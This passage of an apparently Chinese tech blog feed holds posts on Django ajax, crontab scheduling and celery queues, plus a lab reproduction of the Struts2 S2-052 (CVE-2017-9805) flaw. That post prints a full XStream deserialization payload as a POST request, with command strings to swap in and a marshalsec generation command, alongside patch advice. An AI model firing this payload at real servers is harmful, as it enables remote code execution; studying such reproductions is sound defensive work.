class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://code.ziqiangxuetang.com/django/django-ajax.html" target="_blank" rel="external">http://code.ziqiangxuetang.com/django/django-ajax.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Take control of your own desting&lt;br&gt;命运掌握在自己手上&lt;/blockquote&gt;&lt;br&gt;　　本篇主要用来记录django+ajax的一些用法以及注意点，Django使用ajax最大的一个用处，就是不用刷新整个页面的前提下，请求服务端内容来更改页面中某些元素的值。如果使用http请求，就必须重新加载一遍页面，而ajax可以只更改一部分内容。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>struts2-052漏洞</title>
    <link href="http://thief.one/2017/09/06/1/"/>
    <id>http://thief.one/2017/09/06/1/</id>
    <published>2017-09-06T08:26:05.000Z</published>
    <updated>2017-09-06T11:19:33.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">From small beginnings comes great things<br>伟大始于渺小</blockquote><br>　　今年struts2疯了，被爆出了很多高危漏洞，之前我研究过s_045、s_046漏洞，近期又出现了s_052漏洞。s_052漏洞危害稍微小一些，因为利用环境比较苛刻，需要使用Struts2 REST插件的XStream组件。<br><a id="more"></a><br>免责申明：<em>文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负</em></p>
<h3 id="s2-052漏洞介绍"><a href="#s2-052漏洞介绍" class="headerlink" title="s2-052漏洞介绍"></a>s2-052漏洞介绍</h3><p>s2-052漏洞是当用户使用带有XStream组件的Struts-REST插件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可直接在数据包中插入恶意代码。</p>
<p>漏洞编号：CVE-2017-9805（S2-052）<br>漏洞影响：Struts2.5 – Struts2.5.12版本。</p>
<h3 id="s2-052-poc"><a href="#s2-052-poc" class="headerlink" title="s2-052 poc"></a>s2-052 poc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1</div><div class="line">Host: 127.0.0.1:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2365</div><div class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</div><div class="line">Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="variable">$XmlDataSource</span>"</span>&gt;</div><div class="line">            &lt;is class=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</div><div class="line">              &lt;cipher class=<span class="string">"javax.crypto.NullCipher"</span>&gt;</div><div class="line">                &lt;initialized&gt;<span class="literal">false</span>&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</div><div class="line">                  &lt;iter class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</div><div class="line">                    &lt;iter class=<span class="string">"java.util.Collections<span class="variable">$EmptyIterator</span>"</span>/&gt;</div><div class="line">                    &lt;next class=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</div><div class="line">                      &lt;<span class="built_in">command</span>&gt;</div><div class="line">                        &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;</div><div class="line">                      &lt;/<span class="built_in">command</span>&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;<span class="literal">false</span>&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=<span class="string">"javax.imageio.ImageIO<span class="variable">$ContainsFilter</span>"</span>&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=<span class="string">"string"</span>&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=<span class="string">"java.lang.ProcessBuilder<span class="variable">$NullInputStream</span>"</span>/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;<span class="keyword">done</span>&gt;<span class="literal">false</span>&lt;/<span class="keyword">done</span>&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;<span class="literal">false</span>&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;<span class="literal">false</span>&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure>
<p>注意：执行命令的地方在于command内，这里是针对mac下的弹出计算器，如果是windows可改成calc.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built_in">command</span>&gt;</div><div class="line">&lt;string&gt;</div><div class="line">/Applications/Calculator.app/Contents/MacOS/Calculator</div><div class="line">&lt;/string&gt;</div><div class="line">&lt;/<span class="built_in">command</span>&gt;</div></pre></td></tr></table></figure></p>
<h3 id="s2-052漏洞复现"><a href="#s2-052漏洞复现" class="headerlink" title="s2-052漏洞复现"></a>s2-052漏洞复现</h3><h4 id="mac-install-tomcat"><a href="#mac-install-tomcat" class="headerlink" title="mac install tomcat"></a>mac install tomcat</h4><p>在安装tomcat前，先检测一下mac上有没有安装java，可以运行java -version。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">java version <span class="string">"1.8.0_111"</span></div><div class="line">Java(TM) SE Runtime Environment (build 1.8.0_111-b14)</div><div class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.111-b14, mixed mode)</div></pre></td></tr></table></figure></p>
<p>前往tomcat官网下载：<a href="http://tomcat.apache.org/download-80.cgi?from_33lc.com" target="_blank" rel="external">http://tomcat.apache.org/download-80.cgi?from_33lc.com</a> 选择下载Core下的tar.gz包到本地，然后解压。<br>将解压后到文件夹移动到/Library目录下,并命名为Tomcat；然后设置权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chmod 755 /Library/Tomcat/bin/*.sh</div></pre></td></tr></table></figure></p>
<p>进入/Library/Tomcat/bin/目录，运行启动tomcat<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo sh startup.sh</div></pre></td></tr></table></figure></p>
<p>访问：<a href="http://127.0.0.1:8080" target="_blank" rel="external">http://127.0.0.1:8080</a><br>注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。</p>
<p>编写启动关闭tomcat脚本：<br>将以下内容写入tomcat文件中（自己创建）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></div><div class="line">start)</div><div class="line">sh /Library/Tomcat/bin/startup.sh</div><div class="line">;;</div><div class="line">stop)</div><div class="line">sh /Library/Tomcat/bin/shutdown.sh</div><div class="line">;;</div><div class="line">restart)</div><div class="line">sh /Library/Tomcat/bin/shutdown.sh</div><div class="line">sh /Library/Tomcat/bin/startup.sh</div><div class="line">;;</div><div class="line">*)</div><div class="line"><span class="built_in">echo</span> “Usage: start|stop|restart”</div><div class="line">;;</div><div class="line"><span class="keyword">esac</span></div><div class="line"><span class="built_in">exit</span> 0</div></pre></td></tr></table></figure></p>
<p>赋予文件权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 777 tomcat</div></pre></td></tr></table></figure></p>
<p>添加环境变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$PATH</span>:/Library/Tomcat/bin"</span></div></pre></td></tr></table></figure></p>
<p>然后运行启动关闭tomcat：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo tomcat start</div><div class="line">sudo tomcat stop</div></pre></td></tr></table></figure></p>
<p>注：linux、windows安装tomcat方法都与之类似，这里不再演示。</p>
<h4 id="下载部署存在漏洞的struts2版本"><a href="#下载部署存在漏洞的struts2版本" class="headerlink" title="下载部署存在漏洞的struts2版本"></a>下载部署存在漏洞的struts2版本</h4><p>从struts2的官网下载最后受影响的版本<a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="external">struts-2.5.12</a>解压后，将apps目录下的struts2-rest-showcase.war文件放到webapps目录下（/Library/Tomcat/webapps）重启tomcat后访问：<a href="http://127.0.0.1:8080/struts2-rest-showcase/" target="_blank" rel="external">http://127.0.0.1:8080/struts2-rest-showcase/</a></p>
<p><img src="/upload_image/20170906/1.png" alt=""><br>由于burpsuite监控的端口也是8080，所以我将tomcat的端口改成8081了。</p>
<h4 id="构造post包"><a href="#构造post包" class="headerlink" title="构造post包"></a>构造post包</h4><p>可以直接使用上面的poc发包，也可以自己抓取数据包重放，自己抓取的方式是点击页面上的编辑，然后点击submit提交，抓取post包，再修改post的body字段为此漏洞的poc。</p>
<h4 id="尝试不同的poc"><a href="#尝试不同的poc" class="headerlink" title="尝试不同的poc"></a>尝试不同的poc</h4><p>网上使用最多的poc是弹出一个计算器，然而我在mac上测试发现弹出计算器失败了，因此换了一个写文件的poc，发现测试成功。</p>
<p>写文件poc：（会在/tmp/下生成vuln文件）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built_in">command</span>&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/vuln&lt;/string&gt; &lt;/<span class="built_in">command</span>&gt;</div></pre></td></tr></table></figure></p>
<p>弹计算器poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Mac:</div><div class="line">&lt;<span class="built_in">command</span>&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/<span class="built_in">command</span>&gt;</div><div class="line"></div><div class="line">windows:</div><div class="line">&lt;<span class="built_in">command</span>&gt;&lt;string&gt;clac.exe&lt;/string&gt;&lt;/<span class="built_in">command</span>&gt;</div></pre></td></tr></table></figure></p>
<h3 id="poc生成"><a href="#poc生成" class="headerlink" title="poc生成"></a>poc生成</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc.exe &gt; poc.txt</div></pre></td></tr></table></figure>
<p>marshalsec-0.0.1-SNAPSHOT-all.jar网上可以下载，这里不给出地址了，自行搜索。</p>
<h3 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h3><ul>
<li>升级Struts到2.5.13最新版本。</li>
<li>在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs <constant name="struts.action.extension" value="xhtml,,json"></constant></li>
</ul>
<h3 id="python验证脚本"><a href="#python验证脚本" class="headerlink" title="python验证脚本"></a>python验证脚本</h3><p><a href="https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0</a></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.freebuf.com/vuls/146718.html" target="_blank" rel="external">http://www.freebuf.com/vuls/146718.html</a><br><a href="https://www.t00ls.net/thread-41942-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-41942-1-1.html</a><br><a href="http://www.imooc.com/article/6453" target="_blank" rel="external">http://www.imooc.com/article/6453</a><br><a href="https://github.com/jas502n/St2-052/blob/master/README.md" target="_blank" rel="external">https://github.com/jas502n/St2-052/blob/master/README.md</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/">struts2-046漏洞</a><br><a href="http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/">struts2_045漏洞</a><br><a href="http://thief.one/2017/03/13/Struts2%E6%BC%8F%E6%B4%9EPOC%E6%B1%87%E6%80%BB/">struts2漏洞poc汇总</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;From small beginnings comes great things&lt;br&gt;伟大始于渺小&lt;/blockquote&gt;&lt;br&gt;　　今年struts2疯了，被爆出了很多高危漏洞，之前我研究过s_045、s_046漏洞，近期又出现了s_052漏洞。s_052漏洞危害稍微小一些，因为利用环境比较苛刻，需要使用Struts2 REST插件的XStream组件。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://thief.one/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://thief.one/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>crontab计划任务</title>
    <link href="http://thief.one/2017/08/31/1/"/>
    <id>http://thief.one/2017/08/31/1/</id>
    <published>2017-08-31T06:55:02.000Z</published>
    <updated>2017-08-31T07:10:54.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光</blockquote>

<p>crontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。<br><a id="more"></a></p>
<h3 id="计划任务基本格式"><a href="#计划任务基本格式" class="headerlink" title="计划任务基本格式"></a>计划任务基本格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*　　*　　*　　*　　*　　<span class="built_in">command</span></div></pre></td></tr></table></figure>
<ul>
<li>分　时　日　月　周　命令 </li>
<li>第1列表示分钟1～59 每分钟用<em>或者</em>/1表示 </li>
<li>第2列表示小时1～23（0表示0点） </li>
<li>第3列表示日期1～31 </li>
<li>第4列表示月份1～12 </li>
<li>第5列标识号星期0～6（0表示星期天） </li>
<li>第6列要运行的命令</li>
</ul>
<h3 id="crontab-usage"><a href="#crontab-usage" class="headerlink" title="crontab usage"></a>crontab usage</h3><ul>
<li>crontab -h  查看命令帮助</li>
<li>crontab -e  编辑计划任务</li>
<li>sudo crontab -l   列出root的计划任务</li>
<li>crontab -u nmask -l 列出nmask的计划任务</li>
<li>crontab -r 删除计划任务</li>
</ul>
<p>一般写计划任务，都是运行crontab -e然后写入计划任务，保存退出即可。</p>
<h3 id="每秒执行"><a href="#每秒执行" class="headerlink" title="每秒执行"></a>每秒执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * sleep 10;</div></pre></td></tr></table></figure>
<p>每10s运行一次。</p>
<h3 id="crontab文件的一些例子"><a href="#crontab文件的一些例子" class="headerlink" title="crontab文件的一些例子"></a>crontab文件的一些例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">30 21 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每晚的21:30重启apache</div><div class="line"></div><div class="line">45 4 1,10,22 * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每月1、10、22日的4:45</div><div class="line"></div><div class="line">10 1 * * 6,0 /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每周六、日的1:10重启apache</div><div class="line"></div><div class="line">0,30 18-23 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示在每天18:00至23:00之间每隔30分钟重启apache。 </div><div class="line"></div><div class="line">0 23 * * 6 /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每星期六的11:00pm重启apache。 </div><div class="line"></div><div class="line">0 */1 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 每一小时重启apache </div><div class="line"></div><div class="line">0 23-7/1 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 晚上11点到早上7点之间，每隔一小时重启apache </div><div class="line"></div><div class="line">0 11 4 * mon-wed /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 每月的4号与每周一到周三的11点重启apache</div><div class="line"></div><div class="line">0 4 1 jan * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 一月一号的4点重启apache</div></pre></td></tr></table></figure>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * 每分钟执行</div><div class="line">1 * * * * 每小时执行一次</div></pre></td></tr></table></figure>
<p>注意上面2条计划任务，一个是每分钟执行，一个是每小时执行。</p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>如果不确定写的计划任务是否正确，可以在线测试：<a href="http://tool.lu/crontab/" target="_blank" rel="external">http://tool.lu/crontab/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光&lt;/blockquote&gt;

&lt;p&gt;crontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="crontab" scheme="http://thief.one/tags/crontab/"/>
    
  </entry>
  
  <entry>
    <title>celery分布式消息队列</title>
    <link href="http://thief.one/2017/08/25/1/"/>
    <id>http://thief.one/2017/08/25/1/</id>
    <published>2017-08-25T09:58:59.000Z</published>
    <updated>2017-09-28T03:04:41.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Quitters never win and winners never quit<br>退缩者永无胜利，胜利者永不退缩。</blockquote><br>　　之前在分布式消息队列上我一直使用rabbitmq+pika组合，然而由于对rabbitmq与pika理解不深，因此使用过程中遇到了很多坑。直到最近我决定重新研究下分布式消息队列，当然这次抛弃了pika，而选用celery。<br>　　回想之前我对pika与celery有过一些疑问，两者有何区别？又有何相同点？经过几天的研究，目前总算是清晰了一点，因此在此对celery+rabbitmq做个记录。<br><a id="more"></a></p>
<h3 id="安装celery"><a href="#安装celery" class="headerlink" title="安装celery"></a>安装celery</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install celery</div></pre></td></tr></table></figure>
<p>说明：celery只支持python2.7及以上版本，建议在虚拟环境中安装，如何构造虚拟环境可参考：<a href="https://thief.one/2017/08/24/2/">python虚拟环境</a></p>
<h3 id="Celery是如何工作的？"><a href="#Celery是如何工作的？" class="headerlink" title="Celery是如何工作的？"></a>Celery是如何工作的？</h3><p>我在此模拟几个角色来解释下celery+rabbitmq是如何工作的，脑洞来自网络，这里借鉴扩展一番。</p>
<p>假设目前D公司要开半年度工作会议，会议上要指定下半年工作计划，参会人员有老板（下发任务者）、部门主管（celery分配任务者）、部门员工（工作者）、老板秘书（沟通协调者，rabbitmq）。</p>
<h4 id="工作内容是什么？"><a href="#工作内容是什么？" class="headerlink" title="工作内容是什么？"></a>工作内容是什么？</h4><p>　　那么这场会议首先需要确定的是下半年的具体工作内容，这里就称之为“任务内容”。比如老板说我们下半年要开发出一个大数据平台，部门主管举手称赞，表示赞同，于是便愉快地定下了我们具体的工作任务（task），当然开发一个平台算是这个项目的总任务，其中可以细分成很多小的任务，比如大数据算法怎么写？界面怎么设计等。</p>
<h4 id="工作者在哪里？"><a href="#工作者在哪里？" class="headerlink" title="工作者在哪里？"></a>工作者在哪里？</h4><p>　　在确定了具体工作任务后，老板便把这个项目交给了部门主管（celery），而部门主管此时要确定谁去完成这项任务，它可以指定某个人（worker），也可以多个人。</p>
<h4 id="发布工作者在哪里？"><a href="#发布工作者在哪里？" class="headerlink" title="发布工作者在哪里？"></a>发布工作者在哪里？</h4><p>　　毫无疑问发布工作任务的人是老板（下发任务者），他指定了部门主管（celery）什么时候去完成哪些任务，并要求获取反馈信息。但有一点需要注意，老板只管布置任务，但不参与具体的任务分配，那这个任务分配的功能交给谁，没错就是部门主管，即celery。</p>
<h4 id="老板与员工如何沟通项目？"><a href="#老板与员工如何沟通项目？" class="headerlink" title="老板与员工如何沟通项目？"></a>老板与员工如何沟通项目？</h4><p>　　项目之初，老板通过电话将任务传递给部门主管，部门主管通过部门会议将任务分配给员工，过段时间再将任务结果反馈给老板。然而随着任务越来越多，部门主管就发现了一个问题，任务太多了，每个任务还要反馈结果，记不住，也容易弄乱，导致效率下降。<br>　　在召开会议商量了一番后，老板秘书站起来说：“我有个提议，老板每天将布置的任务写成一张纸条放到我这，然后部门主管每天早上来取并交给员工，至于纸条上的任务如何分配，部门主管决定就行，但是要将结果同样写一张纸条反馈给我，我再交给老板。这样老板只负责下发任务，我只负责保管任务纸条，部门主管只负责分配任务并获取反馈，员工只负责按任务工作。大家职责都很明确，效率肯定会更高。”至此，老板与员工的沟通问题也解决了。</p>
<h3 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h3><p>celery_con.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from celery import Celery</div><div class="line">import time</div><div class="line"></div><div class="line">app = Celery(backend=<span class="string">'amqp'</span>, broker=<span class="string">'amqp://guest:guest@127.0.0.1:5672'</span>)</div></pre></td></tr></table></figure></p>
<p>说明：celery_con.py的作用是连接rabbitmq，注意这里是利用celery连接的rabbitmq。映射到场景中，就是秘书与主管，秘书与老板之间传递信息的通道。</p>
<p>task.py（任务内容）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from celery_con import app</div><div class="line"></div><div class="line">@app.task</div><div class="line">def <span class="built_in">test</span>(x, y):</div><div class="line">    time.sleep(5)</div><div class="line">    <span class="built_in">return</span> x + y</div><div class="line"></div><div class="line"></div><div class="line">@app.task</div><div class="line">def scan(x,y):</div><div class="line">    time.sleep(1)</div><div class="line">    <span class="built_in">return</span> x-y</div></pre></td></tr></table></figure></p>
<p>说明：task.py的功能是定制具体的任务，即“任务内容”，映射到场景中便是“开发一个大数据平台”，其中算法要怎么写？界面要如何设计等等。</p>
<p>celery（部门主管）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">celery -A task worker -c 2</div></pre></td></tr></table></figure></p>
<p>说明：此命令为开启work，分配任务；task就是task.py脚本的名称，表示work为task任务服务；-c 2表示同时开启2个work。映射到场景中，便是部门主管实时向秘书获取纸条，并分配给员工。</p>
<p>run.py（老板）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from task import <span class="built_in">test</span>,scan</div><div class="line"></div><div class="line">res=test.delay(2,2)</div><div class="line"><span class="built_in">print</span> res.get()</div></pre></td></tr></table></figure></p>
<p>说明：run.py的作用是下发消息到rabbitmq队列中，映射到场景中即老板将任务写在纸条上交给秘书。</p>
<p>运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python run.py</div></pre></td></tr></table></figure></p>
<p>而这里的秘书指的就是rabbitmq。</p>
<h3 id="celery与pika的区别"><a href="#celery与pika的区别" class="headerlink" title="celery与pika的区别"></a>celery与pika的区别</h3><p>　　简单来说，pika其实就是用来连接rabbitmq服务的一个python客户端模块，而rabbitmq本身只有消息存储功能，并没有任务的分配调度。当然在用pika连接rabbitmq的过程也可以任务分配，这需要利用pika模块自己写一个调度代码，也就是相当于自己写一个celery模块。<br>　　celery就是用来分配任务的，主要是做异步任务队列的，但是celery不具备存储的功能，因此需要一种介质去存储消息，所以常常与rabbitmq一起用。</p>
<h3 id="celery高级用法"><a href="#celery高级用法" class="headerlink" title="celery高级用法"></a>celery高级用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from task import scan</div><div class="line"></div><div class="line">r=scan.s(2,2)</div><div class="line">res=r.delay()</div><div class="line"><span class="built_in">print</span> res.get()</div></pre></td></tr></table></figure>
